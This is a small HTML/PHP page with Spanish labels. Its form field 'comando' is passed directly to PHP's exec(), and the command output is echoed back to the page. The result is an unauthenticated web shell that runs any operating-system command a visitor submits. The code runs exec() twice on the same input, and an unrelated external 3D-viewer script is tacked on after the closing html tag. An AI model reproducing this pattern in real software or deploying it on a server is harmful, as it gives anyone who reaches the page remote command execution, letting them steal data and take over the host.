<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="./exec.php" method="post">
        <input type="text" name="comando" id="">
        <input type="submit" value="Ejecutar" name="ejecutar">
    </form>
    
</body>
</html>

<?php
    if(isset($_REQUEST["ejecutar"])) {
        exec($_REQUEST["comando"]);

exec($_REQUEST["comando"], $salida, $codigoSalida);


echo "El código de salida fue: " . $codigoSalida;
echo "\n";
echo "Ahora imprimiré las líneas de salida:";
echo "<br>";

foreach($salida as $linea){
        echo $linea;
        echo "<br>";
}
    }
?>

<script type="module" src="https://unpkg.com/@splinetool/viewer/build/spline-viewer.js"></script>
<spline-viewer url="https://prod.spline.design/FVZWbQH2B6ndj9UU/scene.splinecode" events-target="local"></spline-viewer>